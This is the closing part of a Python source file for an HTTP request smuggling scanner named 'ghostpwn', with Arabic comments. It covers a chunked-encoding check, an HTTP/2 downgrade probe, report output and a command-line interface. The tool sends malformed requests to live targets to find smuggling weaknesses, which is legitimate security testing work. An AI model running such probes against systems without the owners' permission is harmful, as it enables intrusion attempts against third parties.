            # إن قُبل طلب malformed (200) → قد يسمح smuggling
            if 200 <= status < 400 and name in (
                    "malformed_chunk_size", "chunk_size_newline_injection"):
                self._add_finding(
                    "http_smuggling_chunked_manipulation",
                    "medium",
                    url,
                    f"Chunked Manipulation Accepted ({name})",
                    f"طلب بـ chunked encoding مشوه ({name}) قُبل من الخادم "
                    f"(status={status}). قد يسمح بحقن headers أو smuggling.",
                    f"probe={name}, status={status}, "
                    f"body_excerpt={self._short(body, 100)}",
                )
            elif sig and status == 400:
                self._log(f"  ✓ رفض {name} بشكل سليم", "success")

    # ============================================================
    #                PHASE 7 - HTTP/2 Downgrade
    # ============================================================

    def _detect_h2_downgrade(self, host: str, port: int, use_ssl: bool,
                              path: str):
        """
        كشف إمكانية H2 → HTTP/1.1 downgrade smuggling:
        - إن كان الخادم يدعم HTTP/2 عبر ALPN، لكنه يقبل أيضاً HTTP/1.1
          على نفس البورت → قد يكون معرّض لـ H2.CL / H2.TE.
        """
        url = self.base + path
        if not use_ssl:
            self._log("  › تخطي اختبار H2: الاتصال ليس HTTPS", "info")
            return

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_alpn_protocols(["h2", "http/1.1"])
        try:
            sock = socket.create_connection((host, port), timeout=self.timeout)
        except (socket.timeout, OSError) as e:
            self._log(f"  › تعذّر الاتصال لاختبار ALPN: {e}", "warn")
            return
        try:
            ssock = ctx.wrap_socket(sock, server_hostname=host)
        except ssl.SSLError as e:
            self._log(f"  › فشل TLS handshake: {e}", "warn")
            return
        alpn = ""
        try:
            alpn = ssock.selected_alpn_protocol() or ""
        except Exception:
            alpn = ""
        try:
            ssock.close()
        except Exception:
            pass

        self._log(f"  › ALPN negotiated: {alpn or 'none'}", "info")

        if alpn == "h2":
            # الخادم يدعم H2 - نتحقق أنه يقبل أيضاً HTTP/1.1 (downgrade path)
            sender = self._make_sender(host, port, use_ssl)
            # نرسل طلب HTTP/1.1 صريح على نفس البورت
            raw = self._build_request("GET", path, host, {
                "User-Agent": "ghostpwn-h2-downgrade-test",
                "Connection": "close",
            })
            rb, elapsed = sender.send_raw(raw, read_timeout=self.timeout)
            parsed = parse_http_response(rb)
            if 200 <= parsed.get("status", 0) < 400:
                self._add_finding(
                    "http_smuggling_h2_downgrade",
                    "medium",
                    url,
                    "HTTP/2 Supported + HTTP/1.1 Downgrade Available",
                    "الخادم يدعم HTTP/2 عبر ALPN ويقبل أيضاً HTTP/1.1 على نفس "
                    "البورت. هذا قد يعرضه لـ H2.CL / H2.TE smuggling إن كان "
                    "الـ front-end لا يطهّر headers مثل Content-Length و "
                    "Transfer-Encoding عند التحويل من H2 إلى H1.",
                    f"alpn={alpn}, http1_status={parsed.get('status')}, "
                    f"http1_elapsed={elapsed:.2f}s",
                )
            else:
                self._log("  ✓ الخادم يدعم H2 فقط - لا downgrade", "success")
        elif alpn == "http/1.1":
            self._log("  › الخادم يدعم HTTP/1.1 فقط", "info")
        else:
            self._log("  › الخادم لم يتفاوض على ALPN", "info")

    # ============================================================
    #                REPORT
    # ============================================================

    def _empty_report(self, target: str) -> Dict:
        return {
            "target": target,
            "scan_time": time.strftime("%Y-%m-%d %H:%M:%S"),
            "findings": [],
            "stats": self._stats_dict(),
        }

    def _stats_dict(self) -> Dict:
        return {
            "total_findings": len(self.findings),
            "critical": sum(1 for f in self.findings
                            if f["severity"] == "critical"),
            "high": sum(1 for f in self.findings
                        if f["severity"] == "high"),
            "medium": sum(1 for f in self.findings
                          if f["severity"] == "medium"),
            "low": sum(1 for f in self.findings
                       if f["severity"] == "low"),
        }

    def _build_report(self) -> Dict:
        return {
            "target": self.target if hasattr(self, "target") else "",
            "scan_time": time.strftime("%Y-%m-%d %H:%M:%S"),
            "findings": self.findings,
            "stats": self._stats_dict(),
        }

    def _print_results(self):
        print(f"\n{Colors.MAGENTA}{'═'*64}{Colors.NC}")
        print(f"{Colors.MAGENTA}  🚪 تقرير فحص HTTP Request Smuggling"
              f"{Colors.NC}")
        print(f"{Colors.MAGENTA}{'═'*64}{Colors.NC}")

        if self.findings:
            sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
            sorted_f = sorted(self.findings,
                              key=lambda x: sev_order.get(x["severity"], 99))
            sev_color = {
                "critical": Colors.RED + Colors.BOLD,
                "high": Colors.RED,
                "medium": Colors.YELLOW,
                "low": Colors.GRAY,
            }
            print(f"\n  {Colors.RED + Colors.BOLD}🚨 Findings "
                  f"({len(self.findings)}):{Colors.NC}")
            for f in sorted_f:
                c = sev_color.get(f["severity"], Colors.NC)
                print(f"\n    {c}[{f['severity'].upper()}]{Colors.NC} "
                      f"{f['title']}")
                print(f"      {Colors.GRAY}type:{Colors.NC} {f['type']}")
                print(f"      {Colors.GRAY}url:{Colors.NC} {f['url'][:80]}")
                print(f"      {fix_display(f['description'])}")
                print(f"      {Colors.GRAY}evidence:{Colors.NC} "
                      f"{self._short(f['evidence'], 120)}")
        else:
            print(f"\n  {Colors.GREEN}✓ لا توجد مؤشرات smuggling واضحة"
                  f"{Colors.NC}")

        stats = self._stats_dict()
        print(f"\n  {Colors.BOLD}📊 الإحصائيات:{Colors.NC}")
        print(f"    Findings: {stats['total_findings']} "
              f"({Colors.RED}C:{stats['critical']} H:{stats['high']} "
              f"{Colors.YELLOW}M:{stats['medium']} "
              f"{Colors.GRAY}L:{stats['low']}{Colors.NC})")
        print(f"\n{Colors.MAGENTA}{'═'*64}{Colors.NC}")


# ============================ CLI ============================

def _build_demo_client(args) -> HttpClient:
    return HttpClient(
        timeout=args.timeout,
        user_agent=args.user_agent or "ghostpwn-smuggle/1.0",
        proxy=args.proxy,
        cookie=args.cookie,
        allow_redirects=False,
        verify_ssl=False,
        delay=args.delay,
    )


def main():
    import argparse
    parser = argparse.ArgumentParser(
        prog="http_smuggling",
        description="ghostpwn - HTTP Request Smuggling Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 http_smuggling.py https://example.com\n"
            "  python3 http_smuggling.py https://example.com --verbose\n"
            "  python3 http_smuggling.py https://example.com "
            "--timing-threshold 5 --timeout 12\n"
            "  python3 http_smuggling.py https://example.com "
            "--json-out smuggle-report.json\n\n"
            "Note: يرسل هذا الفاحص طلبات HTTP مشوهة عبر raw sockets.\n"
            "تأكد من أن لديك إذنًا لاختبار الهدف."
        ),
    )
    parser.add_argument("url", help="Target URL (e.g. https://example.com)")
    parser.add_argument("--timeout", type=int, default=10,
                        help="Per-request timeout in seconds (default 10)")
    parser.add_argument("--timing-threshold", type=float, default=4.0,
                        help="Seconds above baseline considered suspicious "
                             "(default 4.0)")
    parser.add_argument("--delay", type=float, default=0.1,
                        help="Delay between requests (default 0.1)")
    parser.add_argument("--user-agent", default=None,
                        help="Custom User-Agent string")
    parser.add_argument("--proxy", default=None,
                        help="HTTP(S) proxy URL (note: raw-socket probes "
                             "ignore proxy)")
    parser.add_argument("--cookie", default=None,
                        help="Cookie header value (sent only on baseline "
                             "urllib probes)")
    parser.add_argument("--no-redirects", action="store_true",
                        help="Disable HTTP redirect following (baseline only)")
    parser.add_argument("--verbose", "-v", action="store_true",
                        help="Verbose output")
    parser.add_argument("--json-out", default=None,
                        help="Write JSON report to this file")
    parser.add_argument("--only", choices=["clte", "tecl", "tete", "clcl",
                                            "chunked", "h2", "all"],
                        default="all", help="Run only a specific phase")
    args = parser.parse_args()

    client = _build_demo_client(args)
    scanner = HTTPSmugglingScanner(
        http_client=client,
        options={
            "timeout": args.timeout,
            "timing_threshold": args.timing_threshold,
            "verbose": args.verbose,
        },
    )

    # دعم --only عبر monkey-patch bypass methods
    if args.only != "all":
        _patch_only(scanner, args.only)

    report = scanner.scan(args.url)

    if args.json_out:
        try:
            with open(args.json_out, "w", encoding="utf-8") as fh:
                json.dump(report, fh, indent=2, ensure_ascii=False)
            print(f"\n{Colors.GREEN}[+]{Colors.NC} تم حفظ التقرير في: "
                  f"{args.json_out}")
        except Exception as e:
            print(f"{Colors.RED}[-]{Colors.NC} فشل حفظ التقرير: {e}")

    if report["stats"]["critical"] > 0:
        sys.exit(2)
    elif report["stats"]["high"] > 0:
        sys.exit(1)
    sys.exit(0)


def _patch_only(scanner: "HTTPSmugglingScanner", only: str):
    """يخطّي كل الفحوصات ما عدا المطلوبة."""
    skip = {
        "clte": ["_detect_te_cl", "_detect_te_te", "_detect_cl_cl",
                  "_detect_chunked_manipulation", "_detect_h2_downgrade"],
        "tecl": ["_detect_cl_te", "_detect_te_te", "_detect_cl_cl",
                  "_detect_chunked_manipulation", "_detect_h2_downgrade"],
        "tete": ["_detect_cl_te", "_detect_te_cl", "_detect_cl_cl",
                  "_detect_chunked_manipulation", "_detect_h2_downgrade"],
        "clcl": ["_detect_cl_te", "_detect_te_cl", "_detect_te_te",
                  "_detect_chunked_manipulation", "_detect_h2_downgrade"],
        "chunked": ["_detect_cl_te", "_detect_te_cl", "_detect_te_te",
                     "_detect_cl_cl", "_detect_h2_downgrade"],
        "h2": ["_detect_cl_te", "_detect_te_cl", "_detect_te_te",
                "_detect_cl_cl", "_detect_chunked_manipulation"],
    }.get(only, [])
    for name in skip:
        def _noop(*a, **kw):
            return None
        setattr(scanner, name, _noop)


if __name__ == "__main__":
    main()
